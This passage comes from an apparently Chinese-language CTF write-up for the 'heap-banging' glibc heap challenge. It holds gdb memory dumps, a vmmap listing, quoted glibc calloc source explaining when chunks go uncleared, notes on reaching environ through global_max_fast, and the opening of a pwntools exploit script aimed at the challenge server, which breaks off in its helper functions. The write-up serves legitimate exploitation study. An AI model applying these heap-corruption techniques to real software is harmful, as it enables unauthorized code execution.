&lt;_IO_2_1_stdin_<span class="number">+0xa5</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cca5d</span>: &lt;_IO_2_1_stdin_<span class="number">+0xdd</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7ccb45</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7ccb6d</span>: &lt;__realloc_hook<span class="number">+0x5</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7ccbc5</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd3dd</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd3f5</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd425</span>: &lt;obstack_alloc_failed_handler<span class="number">+0x5</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">38</span> <span class="number">59</span> <span class="number">79</span> be <span class="number">3</span>c    |  v.........<span class="number">.8</span>Yy.&lt;  |</span><br><span class="line">  <span class="number">0x763cbe7cd44d</span>: &lt;program_invocation_name<span class="number">+0x5</span>&gt;    <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  ................  |</span><br><span class="line">  <span class="number">0x763cbe7cd47d</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ff ff ff ff ff    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd495</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> c0 <span class="number">96</span> <span class="number">7</span>c be <span class="number">3</span>c    |  v............|.&lt;  |</span><br><span class="line">  <span class="number">0x763cbe7cd4cd</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> c0 a1 <span class="number">7</span>c be <span class="number">3</span>c    |  v............|.&lt;  |</span><br><span class="line">  <span class="number">0x763cbe7cd585</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd5a5</span>: &lt;_IO_list_all<span class="number">+0x5</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd665</span>: &lt;_IO_2_1_stderr_<span class="number">+0xa5</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd6e5</span>: &lt;_IO_2_1_stdout_<span class="number">+0x45</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd745</span>: &lt;_IO_2_1_stdout_<span class="number">+0xa5</span>&gt;    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cd79d</span>:    <span class="number">76</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  v...............  |</span><br><span class="line">  <span class="number">0x763cbe7cf605</span>: &lt;environ<span class="number">+0x5</span>&gt;    <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    |  ................  |</span><br></pre></td></tr></table></figure>

<p>在Dockerfile中的nsjail启动之后的内存排布就非常诡异</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; vmmap</span><br><span class="line">[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]</span><br><span class="line">Start              End                Size               Offset             Perm Path</span><br><span class="line"><span class="number">0x00007ffff7dca000</span> <span class="number">0x00007ffff7dec000</span> <span class="number">0x0000000000022000</span> <span class="number">0x0000000000000000</span> r-- /home/user/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007ffff7dec000</span> <span class="number">0x00007ffff7f64000</span> <span class="number">0x0000000000178000</span> <span class="number">0x0000000000022000</span> r-x /home/user/libc.so<span class="number">.6</span>  &lt;-  $rcx, $rip</span><br><span class="line"><span class="number">0x00007ffff7f64000</span> <span class="number">0x00007ffff7fb2000</span> <span class="number">0x000000000004e000</span> <span class="number">0x000000000019a000</span> r-- /home/user/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007ffff7fb2000</span> <span class="number">0x00007ffff7fb6000</span> <span class="number">0x0000000000004000</span> <span class="number">0x00000000001e7000</span> r-- /home/user/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007ffff7fb6000</span> <span class="number">0x00007ffff7fb8000</span> <span class="number">0x0000000000002000</span> <span class="number">0x00000000001eb000</span> rw- /home/user/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007ffff7fb8000</span> <span class="number">0x00007ffff7fbc000</span> <span class="number">0x0000000000004000</span> <span class="number">0x0000000000000000</span> rw-</span><br><span class="line"><span class="number">0x00007ffff7fbc000</span> <span class="number">0x00007ffff7fc0000</span> <span class="number">0x0000000000004000</span> <span class="number">0x00000000001f0000</span> rw- /home/user/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007ffff7fc0000</span> <span class="number">0x00007ffff7fc2000</span> <span class="number">0x0000000000002000</span> <span class="number">0x0000000000000000</span> rw- &lt;tls-th1&gt;</span><br><span class="line"><span class="number">0x00007ffff7fc2000</span> <span class="number">0x00007ffff7fc3000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000000000</span> r-- /home/user/heap-banging</span><br><span class="line"><span class="number">0x00007ffff7fc3000</span> <span class="number">0x00007ffff7fc4000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000001000</span> r-x /home/user/heap-banging  &lt;-  $r12</span><br><span class="line"><span class="number">0x00007ffff7fc4000</span> <span class="number">0x00007ffff7fc5000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000002000</span> r-- /home/user/heap-banging  &lt;-  $r10</span><br><span class="line"><span class="number">0x00007ffff7fc5000</span> <span class="number">0x00007ffff7fc6000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000002000</span> r-- /home/user/heap-banging</span><br><span class="line"><span class="number">0x00007ffff7fc6000</span> <span class="number">0x00007ffff7fc7000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000003000</span> rw- /home/user/heap-banging</span><br><span class="line"><span class="number">0x00007ffff7fc7000</span> <span class="number">0x00007ffff7fc8000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000005000</span> rw- /home/user/heap-banging</span><br><span class="line"><span class="number">0x00007ffff7fc8000</span> <span class="number">0x00007ffff7fc9000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000006000</span> rw- /home/user/heap-banging</span><br><span class="line"><span class="number">0x00007ffff7fc9000</span> <span class="number">0x00007ffff7fcd000</span> <span class="number">0x0000000000004000</span> <span class="number">0x0000000000000000</span> r-- [vvar]</span><br><span class="line"><span class="number">0x00007ffff7fcd000</span> <span class="number">0x00007ffff7fcf000</span> <span class="number">0x0000000000002000</span> <span class="number">0x0000000000000000</span> r-x [vdso]</span><br><span class="line"><span class="number">0x00007ffff7fcf000</span> <span class="number">0x00007ffff7fd0000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000000000</span> r-- /home/user/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007ffff7fd0000</span> <span class="number">0x00007ffff7ff3000</span> <span class="number">0x0000000000023000</span> <span class="number">0x0000000000001000</span> r-x /home/user/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007ffff7ff3000</span> <span class="number">0x00007ffff7ffb000</span> <span class="number">0x0000000000008000</span> <span class="number">0x0000000000024000</span> r-- /home/user/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007ffff7ffc000</span> <span class="number">0x00007ffff7ffd000</span> <span class="number">0x0000000000001000</span> <span class="number">0x000000000002c000</span> r-- /home/user/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007ffff7ffd000</span> <span class="number">0x00007ffff7ffe000</span> <span class="number">0x0000000000001000</span> <span class="number">0x000000000002d000</span> rw- /home/user/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007ffff7ffe000</span> <span class="number">0x00007ffff7fff000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000000000</span> rw- [heap]</span><br><span class="line"><span class="number">0x00007ffff7fff000</span> <span class="number">0x00007ffff8020000</span> <span class="number">0x0000000000021000</span> <span class="number">0x0000000000000000</span> rw- [heap]</span><br><span class="line"><span class="number">0x00007ffffffde000</span> <span class="number">0x00007ffffffff000</span> <span class="number">0x0000000000021000</span> <span class="number">0x0000000000000000</span> rw- [stack]  &lt;-  $rsp, $rbp, $rsi, $r13</span><br></pre></td></tr></table></figure>





<h3 id="solution-01"><a href="#solution-01" class="headerlink" title="solution 01"></a>solution 01</h3><p>You can use a size of 0x82 and then the chunk isn’t cleaned</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_calloc (<span class="type">size_t</span> n, <span class="type">size_t</span> elem_size)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span> (!mem || <span class="built_in">chunk_is_mmapped</span> (<span class="built_in">mem2chunk</span> (mem)) ||</span><br><span class="line">          av == <span class="built_in">arena_for_chunk</span> (<span class="built_in">mem2chunk</span> (mem)));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (mem == <span class="number">0</span> &amp;&amp; av != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">LIBC_PROBE</span> (memory_calloc_retry, <span class="number">1</span>, sz);</span><br><span class="line">	  av = <span class="built_in">arena_get_retry</span> (av, sz);</span><br><span class="line">	  mem = _int_malloc (av, sz);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != <span class="literal">NULL</span>)</span><br><span class="line">	__libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocation failed even after a retry.  */</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p = <span class="built_in">mem2chunk</span> (mem);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Two optional cases in which clearing not necessary */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunk_is_mmapped</span> (p)) <span class="comment">// 如果chunk是mmaped，那么不会memset</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> mem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  csz = <span class="built_in">chunksize</span> (p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">  <span class="keyword">if</span> (perturb_byte == <span class="number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* clear only the bytes from non-freshly-sbrked memory */</span></span><br><span class="line">      csz = oldtopsize;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span></span><br><span class="line"><span class="comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span></span><br><span class="line"><span class="comment">     minimally 3.  */</span></span><br><span class="line">  d = (INTERNAL_SIZE_T *) mem;</span><br><span class="line">  clearsize = csz - SIZE_SZ;</span><br><span class="line">  nclears = clearsize / <span class="built_in">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">  <span class="built_in">assert</span> (nclears &gt;= <span class="number">3</span>);</span><br><span class="line">  <span class="comment">// 这里正常memset calloc分配后的mem</span></span><br><span class="line">  <span class="keyword">if</span> (nclears &gt; <span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (d, <span class="number">0</span>, clearsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(d + <span class="number">0</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (nclears &gt; <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          *(d + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">          *(d + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (nclears &gt; <span class="number">6</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">              *(d + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (nclears &gt; <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  *(d + <span class="number">7</span>) = <span class="number">0</span>;</span><br><span class="line">                  *(d + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，chunk 必须是mmaped的，calloc才会将chunk清空</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Size of chunk, in bytes                     |A|M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">	    .                                                               .</span></span><br><span class="line"><span class="comment">	    .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">	    .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             (size of chunk, but used for application data)    |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Size of next chunk, in bytes                |A|0|1|</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">*/</span>            </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure>

<p>正常我们分配的堆都是brk出来的，不是mmaped</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|             Size of chunk, in bytes                     |A|M|P|</span><br></pre></td></tr></table></figure>



<p>这里难受的点在于global_max_fast 距离 environ太远了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p $<span class="number">1</span>-(<span class="type">size_t</span>)&amp;global_max_fast</span><br><span class="line">$<span class="number">4</span> = <span class="number">0x760</span></span><br></pre></td></tr></table></figure>

<p>至少需要写15-16个0x80大小的chunk，这也太困难了，构造很费劲，因为操作的总次数<code>ops</code>被限制为0x40，而每次的fastbin 都要free edit malloc malloc，<code>ops</code>不够用</p>
<p>哎，堆风水，注意一下细节就够用了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="function">env python3</span></span><br><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">r </span>= lambda x: p.<span class="built_in">recvuntil</span>(x,drop=True)</span><br><span class="line">s = lambda x,y: p.<span class="built_in">sendafter</span>(x,y)</span><br><span class="line">ii = lambda x: p.<span class="built_in">sendafter</span>(<span class="string">&#x27;&gt;&gt; &#x27;</span>, x.<span class="built_in">ljust</span>(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.r:</span><br><span class="line">    HOST,PORT = <span class="string">&quot;heap-banging.chal.crewc.tf&quot;</span>, <span class="number">1337</span></span><br><span class="line">    p = <span class="built_in">remote</span>(HOST, PORT, ssl=True)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    p = <span class="built_in">process</span>(<span class="string">&#x27;./heap-banging-patch&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">malloc</span>():</span><br><span class="line">    <span class="built_in">ii</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">show</span>(idx):</span><br><span class="line">    <span class="built_in">ii</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="built_in">s</span>(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx).<span class="built_in">ljust</span>(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(idx, cnt):</span><br><span class="line">    <span class="built_in">ii</span>(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">s</span>(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx).<span class="built_in">ljust</span>(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    p.<span class="built_in">send</span>(cnt)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(idx):</span><br><span class="line">    <span class="built_in">ii</span>(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="built_in">s</span>(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx).<span class="built_in">ljust</span>(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">z</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.r:</span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span 